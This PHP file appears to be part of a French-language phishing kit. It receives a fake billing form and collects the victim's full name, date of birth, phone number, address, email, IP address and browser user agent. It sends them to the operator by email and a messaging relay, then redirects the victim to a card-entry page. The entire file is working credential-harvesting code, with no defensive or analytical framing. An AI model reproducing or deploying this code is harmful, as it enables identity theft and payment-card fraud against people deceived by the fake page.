<?php
session_start();
include '../../settings.php';
include '../core/funcs.php';

if (isset($_POST['name'],$_POST['dob'],$_POST['tel'],$_POST['address'])) {
    $_SESSION['name'] = $_POST['name'];
    $_SESSION['fname'] = $_POST['fname'];
    $_SESSION['dob'] = $_POST['dob'];
    $_SESSION['tel'] = $_POST['tel'];
    $_SESSION['address'] = $_POST['address'];
    $_SESSION['email'] = $_POST['email'];
    $message = "<strong>[+1 Nouveaux billing : ".$_SESSION['name']."]</strong>
    
🔧 Nom et prénom : <pre>".$_SESSION['name'] . " ".$_SESSION['fname'] . "</pre>
🔧 Date de naissance : <pre>".$_SESSION['dob']."</pre>
🔧 Numéro de téléphone : <pre>".$_SESSION['tel']."</pre>
                    
🔧 Adresse Complète : <pre>".$_SESSION['address']."</pre>
        
🔧 E-mail: ".$_SESSION['email']."

🔧 IP : ".$_SERVER['REMOTE_ADDR']."
🔧 UA : " . $_SERVER['HTTP_USER_AGENT'];
    update('informations');
    if ($billing) {
        sendMailRez($email,"🪪 + 1 Nouveaux billing : [".$_SESSION['name']."] 🪪",$message);
        sendMessage($message);
    }
    header('location: ../loading.php?page=card.php');
}